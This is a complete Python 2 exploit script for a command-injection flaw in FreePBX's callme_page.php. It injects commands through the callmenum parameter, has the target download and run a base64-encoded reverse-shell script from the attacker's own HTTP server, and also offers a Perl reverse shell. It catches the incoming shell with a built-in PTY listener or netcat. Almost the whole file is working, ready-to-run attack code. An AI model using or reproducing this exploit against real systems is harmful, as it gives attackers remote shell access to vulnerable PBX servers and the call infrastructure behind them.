#!/usr/bin/env python2
#  -*- coding: utf-8 -*- #######################################################################################
#▓█████  ██▓    ▄▄▄        ██████ ▄▄▄█████▓ ██▓ ▄████▄   ██▀███   ▄████▄  ▓█████                               #
#▓█   ▀ ▓██▒   ▒████▄    ▒██    ▒ ▓  ██▒ ▓▒▓██▒▒██▀ ▀█  ▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀                               #
#▒███   ▒██░   ▒██  ▀█▄  ░ ▓██▄   ▒ ▓██░ ▒░▒██▒▒▓█    ▄ ▓██ ░▄█ ▒▒▓█    ▄ ▒███                                 #
#▒▓█  ▄ ▒██░   ░██▄▄▄▄██   ▒   ██▒░ ▓██▓ ░ ░██░▒▓▓▄ ▄██▒▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄                               #
#░▒████▒░██████▒▓█   ▓██▒▒██████▒▒  ▒██▒ ░ ░██░▒ ▓███▀ ░░██▓ ▒██▒▒ ▓███▀ ░░▒████▒                              #
#░░ ▒░ ░░ ▒░▓  ░▒▒   ▓▒█░▒ ▒▓▒ ▒ ░  ▒ ░░   ░▓  ░ ░▒ ▒  ░░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░                              #
#░ ░  ░░ ░ ▒  ░ ▒   ▒▒ ░░ ░▒  ░ ░    ░     ▒ ░  ░  ▒     ░▒ ░ ▒░  ░  ▒    ░ ░  ░                               #
#░     ░ ░    ░   ▒   ░  ░  ░    ░       ▒ ░░          ░░   ░ ░           ░                                    #
#░  ░    ░  ░     ░  ░      ░            ░  ░ ░         ░     ░ ░         ░  ░                                 #
#░                 ░                                                                                           #
#                                                                                                              #
# DATE                                                                                                         #
# 20/02/2019                                                                                                   #
#                                                                                                              #
# DESCRIPTION                                                                                                  #
# The callme_startcall function in recordings/misc/callme_page.php in FreePBX 2.9, 2.10,                       #
# and earlier allows remote attackers to execute arbitrary commands via the callmenum parameter in a c action. #
#                                                                                                              #
# nighter@nighter.se                                                                                           #
#                                                                                                              #
################################################################################################################

import signal
import termios
import select
import socket
import os
import fcntl
import base64
import sys
import time
import ssl
import urllib
import urllib as ul

import SimpleHTTPServer
import SocketServer
import struct

from multiprocessing import Process

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print "\nYou pressed Ctrl+C!"
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


class PTY:
    def __init__(self, slave=0, pid=os.getpid()):
        # apparently python GC's modules before class instances so, here
        # we have some hax to ensure we can restore the terminal state.
        self.termios, self.fcntl = termios, fcntl

        # open our controlling PTY
        self.pty = open(os.readlink("/proc/%d/fd/%d" % (pid, slave)), "rb+")

        # store our old termios settings so we can restore after
        # we are finished
        self.oldtermios = termios.tcgetattr(self.pty)

        # get the current settings se we can modify them
        newattr = termios.tcgetattr(self.pty)

        # set the terminal to uncanonical mode and turn off
        # input echo.
        newattr[3] &= ~termios.ICANON & ~termios.ECHO

        # don't handle ^C / ^Z / ^\
        newattr[6][termios.VINTR] = '\x00'
        newattr[6][termios.VQUIT] = '\x00'
        newattr[6][termios.VSUSP] = '\x00'

        # set our new attributes
        termios.tcsetattr(self.pty, termios.TCSADRAIN, newattr)

        # store the old fcntl flags
        self.oldflags = fcntl.fcntl(self.pty, fcntl.F_GETFL)
        # fcntl.fcntl(self.pty, fcntl.F_SETFD, fcntl.FD_CLOEXEC)
        # make the PTY non-blocking
        fcntl.fcntl(self.pty, fcntl.F_SETFL, self.oldflags | os.O_NONBLOCK)

    def read(self, size=8192):
        return self.pty.read(size)

    def write(self, data):
        ret = self.pty.write(data)
        self.pty.flush()
        return ret

    def fileno(self):
        return self.pty.fileno()

    def __del__(self):
        # restore the terminal settings on deletion
        self.termios.tcsetattr(self.pty, self.termios.TCSAFLUSH, self.oldtermios)
        self.fcntl.fcntl(self.pty, self.fcntl.F_SETFL, self.oldflags)


class Shell:
    def __init__(self, addr, bind=True):
        self.bind = bind
        self.addr = addr

        if self.bind:
            self.sock = socket.socket()
            self.sock.bind(self.addr)
            self.sock.listen(5)

    def handle(self, addr=None):
        addr = addr or self.addr
        if self.bind:
            sock, addr = self.sock.accept()
        else:
            sock = socket.socket()
            sock.connect(addr)

        # create our PTY
        pty = PTY()

        # input buffers for the fd's
        buffers = [[sock, []], [pty, []]]

        def buffer_index(fd):
            for index, buffer in enumerate(buffers):
                if buffer[0] == fd:
                    return index

        readable_fds = [sock, pty]

        data = " "
        # keep going until something deds
        while data:
            # if any of the fd's need to be written to, add them to the
            # writable_fds
            writable_fds = []
            for buffer in buffers:
                if buffer[1]:
                    writable_fds.append(buffer[0])

            r, w, x = select.select(readable_fds, writable_fds, [])

            # read from the fd's and store their input in the other fd's buffer
            for fd in r:
                buffer = buffers[buffer_index(fd) ^ 1][1]
                if hasattr(fd, "read"):
                    data = fd.read(8192)
                else:
                    data = fd.recv(8192)
                if data:
                    buffer.append(data)

            # send data from each buffer onto the proper FD
            for fd in w:
                buffer = buffers[buffer_index(fd)][1]
                data = buffer[0]
                if hasattr(fd, "write"):
                    fd.write(data)
                else:
                    fd.send(data)
                buffer.remove(data)

        # close the socket
        sock.close()


def BuildPythonReverseShell():

    print("[+] Build payload")
    os.chdir('/tmp')
    python_rev_shell = '''python -c \'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);\
s.connect(("%s", %s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");s.close()\'''' % (LHOST, LPORT)
    payload = '#!/bin/bash\necho %s|base64 -d|bash' % base64.b64encode(python_rev_shell)

    with open('/tmp/exploit.sh', 'w') as file:
        file.write(payload)


def HttpListener():

    os.chdir('/tmp')
    HTTP_PORT = 8888
    Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
    httpd = SocketServer.TCPServer(("", HTTP_PORT), Handler)
    print("[+] HTTP Listen = %s" % HTTP_PORT)
    httpd.serve_forever()


def rce_exec(command=''):

    extension = "1000"
    payload = ul.quote_plus(command).replace('+', '%20')
    url = str(URL) + '/recordings/misc/callme_page.php?action=c&callmenum=' + str(extension) + '@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20' + payload

    print("[+] COMMAND: %s" % command)
    if url.startswith('https') is True:
        context = ssl._create_unverified_context()
        urllib.urlopen(url, context=context)
    else:
        urllib.urlopen(url)


def exploit():

    time.sleep(2)

    payload = """perl -MIO -e 'system("wget -P /tmp http://%s:8888/exploit.sh");'""" % LHOST
    rce_exec(payload)
    time.sleep(1)
    payload = """perl -MIO -e 'system("chmod +x /tmp/exploit.sh");'"""
    rce_exec(payload)
    time.sleep(1)
    payload = """perl -MIO -e 'system("/tmp/exploit.sh");'"""
    rce_exec(payload)


def perl_exploit():

    time.sleep(2)
    command = """perl -MIO -e 'use Socket;$i=\""""+LHOST+"""\";$p=""" + LPORT + """;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""

    extension = "1000"
    payload = ul.quote_plus(command).replace('+', '%20')
    url = str(URL) + '/recordings/misc/callme_page.php?action=c&callmenum=' + str(extension) + '@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20' + payload

    print("[+] COMMAND: %s" % command)
    if url.startswith('https') is True:
        context = ssl._create_unverified_context()
        urllib.urlopen(url, context=context)
    else:
        urllib.urlopen(url)


if __name__ == '__main__':

    if len(sys.argv) <= 4:
        print ("""
▓█████  ██▓    ▄▄▄        ██████ ▄▄▄█████▓ ██▓ ▄████▄   ██▀███   ▄████▄  ▓█████ 
▓█   ▀ ▓██▒   ▒████▄    ▒██    ▒ ▓  ██▒ ▓▒▓██▒▒██▀ ▀█  ▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀ 
▒███   ▒██░   ▒██  ▀█▄  ░ ▓██▄   ▒ ▓██░ ▒░▒██▒▒▓█    ▄ ▓██ ░▄█ ▒▒▓█    ▄ ▒███   
▒▓█  ▄ ▒██░   ░██▄▄▄▄██   ▒   ██▒░ ▓██▓ ░ ░██░▒▓▓▄ ▄██▒▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄ 
░▒████▒░██████▒▓█   ▓██▒▒██████▒▒  ▒██▒ ░ ░██░▒ ▓███▀ ░░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
░░ ▒░ ░░ ▒░▓  ░▒▒   ▓▒█░▒ ▒▓▒ ▒ ░  ▒ ░░   ░▓  ░ ░▒ ▒  ░░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
 ░ ░  ░░ ░ ▒  ░ ▒   ▒▒ ░░ ░▒  ░ ░    ░     ▒ ░  ░  ▒     ░▒ ░ ▒░  ░  ▒    ░ ░  ░
   ░     ░ ░    ░   ▒   ░  ░  ░    ░       ▒ ░░          ░░   ░ ░           ░   
   ░  ░    ░  ░     ░  ░      ░            ░  ░ ░         ░     ░ ░         ░  ░
                                              ░                 ░               
[nighter@nighter.se]
    """)
        print("Usage: %s <URL> <LHOST> <LPORT>" % (sys.argv[0]))
        print("EXAMPLE: ./elastic_rce.py 'http://10.10.10.70' 10.11.0.xxx 1337 [1=python|2=perl]\n")
        sys.exit(0)

    URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    try:
        TYPE = str(sys.argv[4])
    except:
        TYPE = '1'

    print "[+] LHOST = %s" % LHOST
    print "[+] LPORT = %s" % LPORT

    if TYPE == '2':

        # Run exploit Async
        p = Process(target=perl_exploit)
        p.start()

        print "[+] Netcat = %s" % LPORT
        os.system('nc -lnvp %s' % LPORT)
    else:
        BuildPythonReverseShell()

        p = Process(target=HttpListener)
        p.start()

        # Run exploit Async
        p = Process(target=exploit)
        p.start()

        # Start listener
        print("[+] Shell listen")
        s = Shell((LHOST, int(LPORT)), bind=True)
        s.handle()